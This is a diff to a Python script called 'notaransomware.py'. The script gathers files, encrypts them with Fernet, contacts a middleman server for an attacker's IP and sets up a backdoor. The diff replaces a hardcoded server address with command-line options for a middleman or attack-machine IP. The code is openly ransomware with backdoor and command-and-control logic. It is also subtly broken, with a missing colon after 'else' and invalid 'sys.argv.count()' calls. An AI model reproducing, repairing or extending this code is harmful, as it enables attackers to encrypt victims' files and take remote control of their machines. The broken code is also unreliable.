@@ -1,6 +1,7 @@
 import os
 import socket
 import subprocess
+import sys
 from cryptography.fernet import Fernet
 
 files = []
@@ -34,20 +35,20 @@ def find_more_files():
 
 BUFFER_SIZE = 512
 
-def get_lan_ip_from_mid_server():
+def get_lan_ip_from_mid_server(middleman_ip):
     global BUFFER_SIZE
     REQUEST_LAN_IP_BYTES            = b"\x01"
-    ABOUT_TO_RECIEVE_LAN_IP_BYTES   = b"\x02"
+    ABOUT_TO_RECEIVE_LAN_IP_BYTES   = b"\x02"
     OKAY_BYTES                      = b"\x03"
 
     s = socket.socket()
     try:
-        s.connect(("175.45.180.103", 55037))
+        s.connect((middleman_ip, 55037))
     except TimeoutError:
         get_lan_ip_from_mid_server()
     msg = b""
 
-    while msg != ABOUT_TO_RECIEVE_LAN_IP_BYTES:
+    while msg != ABOUT_TO_RECEIVE_LAN_IP_BYTES:
         msg = s.recv(BUFFER_SIZE)
         s.send(REQUEST_LAN_IP_BYTES)
 
@@ -82,9 +83,11 @@ def setup_backdoor(lan_ip):
     s.close()
 
 
-def main():
-    lan_ip = get_lan_ip_from_mid_server()
-    print(f"LAN IP: {lan_ip}")
+def main(middleman_ip, direct_ip):
+    if middleman_ip:
+        lan_ip = get_lan_ip_from_mid_server(middleman_ip)
+    else
+        lan_ip = direct_ip
     setup_backdoor(lan_ip)
     exit()
 
@@ -109,4 +112,24 @@ def main():
             f.write(encrypted_contents)
         
 if __name__ == "__main__":
-    main()
+    middleman_ip = None
+    direct_ip = None
+    skip = False
+    for arg in sys.argv:
+        if skip:
+            middleman_ip = arg
+            skip = False
+            continue
+        if arg == "-m":
+            if sys.argv.count() != 3:
+                print("usage: python notaransomware.py [-m <ip of middleserver>] or [-d <ip of attack machine>]")
+                exit(1)
+            else:
+                skip = True
+        else:
+            if sys.argv.count() != 2:
+                print("usage: python notaransomware.py [-m <ip of middleserver>] or [-d <ip of attack machine>]")
+                exit(1)
+            else:
+                direct_ip = sys.argv[1]
+    main(middleman_ip=middleman_ip, direct_ip=direct_ip)
